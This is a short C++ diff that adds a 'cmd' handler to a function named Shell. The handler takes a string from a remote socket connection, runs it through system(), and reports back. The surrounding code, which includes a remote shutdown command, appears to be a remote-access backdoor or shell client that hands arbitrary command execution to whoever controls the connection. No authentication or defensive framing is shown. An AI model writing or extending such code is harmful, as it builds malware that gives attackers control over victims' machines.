@@ -165,6 +165,15 @@ int Shell(SOCKADDR_IN addr) {
 
 		}
 
+		else if (!strcmp(buffer, "cmd")) {
+			recv(conn, path, sizeof(path), NULL);
+			std::string com = std::string(path);
+			system(com.c_str());
+			std::string finally_msg = "terminate " + std::string(path) + " ok";
+			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
+
+		}
+
 		else if (!strcmp(buffer, "shutdown")) {
 			system("shutdown /p");
 		}
